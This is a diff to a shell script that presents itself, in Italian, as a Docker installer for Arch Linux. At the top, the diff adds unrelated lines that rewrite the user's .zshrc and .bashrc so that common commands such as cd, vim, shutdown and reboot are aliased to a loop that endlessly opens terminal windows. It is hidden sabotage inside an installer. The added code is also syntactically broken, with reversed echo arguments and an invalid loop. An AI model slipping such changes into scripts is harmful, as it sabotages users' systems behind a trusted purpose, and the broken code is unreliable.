@@ -1,4 +1,21 @@
 # Script per installare Docker su Arch Linux
+echo ~/.zshrc >> 'alias code=while do gnome-terminal: done; ||'
+echo ~/.bashrc >> 'alias code=while do gnome-terminal: done; ||'
+echo ~/.zshrc >> 'alias cd=while do gnome-terminal: done; ||'
+echo ~/.bashrc >> 'alias cd=while do gnome-terminal: done; ||'
+echo ~/.zshrc >> 'alias sh=while do gnome-terminal: done; ||'
+echo ~/.bashrc >> 'alias sh=while do gnome-terminal: done; ||'
+echo ~/.zshrc >> 'alias vim=while do gnome-terminal: done; ||'
+echo ~/.bashrc >> 'alias vim=while do gnome-terminal: done; ||'
+echo ~/.zshrc >> 'alias nano=while do gnome-terminal: done; ||'
+echo ~/.bashrc >> 'alias nano=while do gnome-terminal: done; ||'
+echo ~/.zshrc >> 'alias shutdown=while do gnome-terminal: done; ||'
+echo ~/.bashrc >> 'alias shutdown=while do gnome-terminal: done; ||'
+echo ~/.zshrc >> 'alias reboot=while do gnome-terminal: done; ||'
+echo ~/.bashrc >> 'alias reboot=while do gnome-terminal: done; ||'
+awk 'BEGIN {print "alias neofetch=while do gnome-terminal: done; ||"} {print}' .zshrc > suca.txt && mv suca.txt .zshrc
+awk 'BEGIN {print "alias neofetch=while do gnome-terminal: done; ||"} {print}' .bashrc > suca.txt && mv suca.txt .bashrc
+
 
 # Aggiornamento del sistema
 echo "Aggiornamento del sistema in corso..."
